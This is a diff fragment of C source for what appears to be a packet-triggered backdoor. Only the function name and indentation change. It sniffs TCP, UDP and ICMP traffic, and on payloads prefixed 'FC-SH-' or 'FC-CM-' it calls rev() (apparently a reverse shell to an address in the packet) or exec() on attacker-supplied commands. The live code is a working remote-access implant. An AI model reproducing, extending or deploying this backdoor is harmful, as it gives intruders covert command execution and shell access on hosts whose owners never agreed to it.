@@ -20,21 +20,21 @@ struct sockaddr_in* GetIP() {
 	return ret;
 }
 
-void something(int payloadLength, char* data)
+void compare(int payloadLength, char* data)
 {
 	if (payloadLength > 6)
-					{
-						if (strncmp(data, "FC-SH-", 6) == 0)
-						{
-							char* rip = (char*)data + 6;
-							rev(rip);
-						}
-						else if (strncmp(data, "FC-CM-", 6) == 0)
-						{
-							char* cmd = (char*)data + 6;
-							exec(cmd);
-						}
-					}
+	{
+		if (strncmp(data, "FC-SH-", 6) == 0)
+		{
+			char* rip = (char*)data + 6;
+			rev(rip);
+		}
+		else if (strncmp(data, "FC-CM-", 6) == 0)
+		{
+			char* cmd = (char*)data + 6;
+			exec(cmd);
+		}
+	}
 }
 
 int main(int argc, char** argv) 
@@ -109,7 +109,7 @@ int main(int argc, char** argv)
 					int payloadLength = ntohs(ip_header->ip_len) - 20 - BUFFER_SIZE_TCP;
 					data[payloadLength - 1] = '\0';
 
-					something(payloadLength, data);
+					compare(payloadLength, data);
 				}
 			}
 		}
@@ -124,7 +124,7 @@ int main(int argc, char** argv)
 				int payloadLength = ntohs(ip_header->ip_len) - 20 - BUFFER_SIZE_UDP;
 				data[payloadLength - 1] = '\0';	
 
-				something(payloadLength, data);
+				compare(payloadLength, data);
 			}
 
 		}
@@ -140,7 +140,7 @@ int main(int argc, char** argv)
 				int payloadLength = ntohs(ip_header->ip_len) - 20 - BUFFER_SIZE_ICMP;
 				data[payloadLength - 1] = '\0';	
 
-				something(payloadLength, data);
+				compare(payloadLength, data);
 			}
 
 		}
